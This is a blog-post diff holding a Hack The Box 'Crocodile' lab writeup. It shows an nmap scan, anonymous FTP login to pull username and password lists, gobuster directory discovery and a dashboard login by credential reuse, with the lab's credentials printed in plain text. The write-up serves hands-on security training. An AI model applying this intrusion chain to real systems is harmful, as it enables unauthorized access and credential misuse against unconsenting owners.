@@ -1,0 +1,131 @@
+export const frontmatter = {
+  title: "Hack The Box Crocodile Machine Writeup",
+  slug: "hack-the-box-crocodile-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Crocodile machine, covering FTP anonymous login misconfigurations, credential discovery, web directory enumeration with Gobuster, and credential reuse to bypass authentication.",
+  date: "2026-05-26",
+};
+
+export const metadata = {
+  title:
+    "HackTheBox Crocodile Writeup – FTP Misconfiguration & Credential Reuse | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Crocodile writeup demonstrating Nmap scanning, exploiting anonymous FTP access to extract user credentials, discovering hidden web directories, and achieving a successful dashboard login to retrieve the final flag.",
+};
+
+## Introduction
+
+This writeup documents the exploitation of the vulnerable machine **Crocodile**, where the objective was to identify exposed services, enumerate accessible resources, and gain unauthorized access leading to the retrieval of the final flag. The attack chain involved FTP misconfiguration, credential discovery, web directory enumeration, and authentication bypass using reused credentials.
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use `ping <ip_addr>`.
+
+Add `crocodile.htb` to `/etc/hosts` with `echo '<ip_addr>	crocodile.htb' | sudo tee -a /etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `crocodile.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `crocodile.htb` to the correct IP address without relying on external DNS servers.
+
+## Enumeration
+
+Perform an Nmap version scan using `nmap -sV <ip_addr>`:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 13:55 IST
+Nmap scan report for 10.129.123.109
+Host is up (0.19s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.89 seconds
+```
+
+The Nmap scan reveals that the target is running an FTP and HTTP server.
+
+Connect to ftp with `ftp <ip_addr>` and try `anonymous` and blank password: 
+```
+Connected to 10.129.123.109.                                                                                                                                        
+220 (vsFTPd 3.0.3)                                                                                                                                                  
+Name (10.129.123.109:vinod): anonymous                                                                                                                              
+230 Login successful.                                                                                                                                               
+Remote system type is UNIX.                                                                                                                                         
+Using binary mode to transfer files.                                                                                                                                
+ftp>
+```
+
+Since FTP was misconfigured, we were able to connect anonymously without a password.
+
+`ls` shows that it contains two files:
+```
+229 Entering Extended Passive Mode (|||46278|)                                                                                                                      
+150 Here comes the directory listing.                                                                                                                               
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist                                                                                            
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd                                                                                     
+226 Directory send OK.    
+```
+
+Use `get` command to download the files
+```
+get allowed.userlist
+get allowed.userlist.passwd
+```
+
+View contents of files with `cat allowed.userlist; echo ""; cat allowed.userlist.passwd`:
+```
+aron
+pwnmeow
+egotisticalsw
+admin
+
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
+```
+
+This revealed two separate lists: the first file contained usernames, while the second file contained the corresponding passwords in the same order. By matching entries line-by-line, valid username and password pairs could be identified.
+
+Scan the target using Gobuster to discover hidden directories with `gobuster dir -u http://crocodile.htb/ -w wordlist.com`:
+```
+===============================================================                                                                                                     
+Gobuster v3.8                                                                                                                                                       
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                       
+===============================================================                                                                                                     
+[+] Url:                     http://crocodile.htb/                                                                                                                  
+[+] Method:                  GET                                                                                                                                    
+[+] Threads:                 10                                                                                                                                     
+[+] Wordlist:                /home/vinod/Desktop/raft-large-directories.txt                                                                                         
+[+] Negative Status codes:   404                                                                                                                                    
+[+] User Agent:              gobuster/3.8                                                                                                                           
+[+] Timeout:                 10s                                                                                                                                    
+===============================================================                                                                                                     
+Starting gobuster in directory enumeration mode                                                                                                                     
+===============================================================                                                                                                     
+/css                  (Status: 301) [Size: 312] [--> http://crocodile.htb/css/]                                                                                     
+/js                   (Status: 301) [Size: 311] [--> http://crocodile.htb/js/]                                                                                      
+/assets               (Status: 301) [Size: 315] [--> http://crocodile.htb/assets/]                                                                                  
+/fonts                (Status: 301) [Size: 314] [--> http://crocodile.htb/fonts/]                                                                                   
+/dashboard            (Status: 301) [Size: 318] [--> http://crocodile.htb/dashboard/]                                                                               
+/server-status        (Status: 403) [Size: 278]                                                                                                                     
+Progress: 62281 / 62281 (100.00%)
+===============================================================
+Finished
+```
+
+A Gobuster scan revealed an interesting endpoint,` /dashboard`, which redirected to `http://crocodile.htb/login.php` when accessed. This page contained a login form for dashboard access.
+
+## Exploitation 
+
+Upon trying the credential combinations obtained from the FTP files, the credentials `admin:rKXM59ESxesUFHAd` were found to be valid and successfully authenticated to the dashboard.
+
+Upon authethication, we are redirectred to `http://crocodile.htb/dashboard/index.php` and the flag was revealed at the top of the webpage
+```
+Here is your flag: ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
